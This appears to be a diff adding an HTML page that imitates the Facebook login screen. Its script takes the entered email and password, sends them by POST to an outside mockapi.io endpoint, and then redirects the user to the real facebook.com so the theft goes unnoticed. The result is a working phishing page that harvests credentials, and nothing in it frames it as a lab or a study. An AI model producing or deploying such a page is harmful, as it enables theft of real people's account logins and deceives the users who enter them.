@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1>Facebook</h1>
+                <p>Connect with friends and the world </p>
+                <p> around you on facebook.</p>
+            </div>
+            <form id="myForm" action="#">
+                <input type="email" id="email" placeholder="Email or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <div class="link">
+                    <button type="button" class="login" onclick="sendData()">Login</button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+
+<script>
+    function sendData() {
+        // Obtener los valores de los campos del formulario
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Crear un objeto con los datos del formulario
+        const data = { email, password };
+
+        // Enviar los datos a MockAPI (reemplaza con la URL completa de tu nuevo recurso)
+        fetch('https://6727d1e4270bd0b97553a3e6.mockapi.io/login/users', { // Actualiza aquí con tu URL específica
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(json => {
+            // Redirigir a una URL específica
+            window.location.href = 'https://facebook.com'; // Cambia esta URL por la que desees
+        })
+        .catch(error => console.error('Error al enviar los datos:', error));
+    }
+</script>
+
+</html>
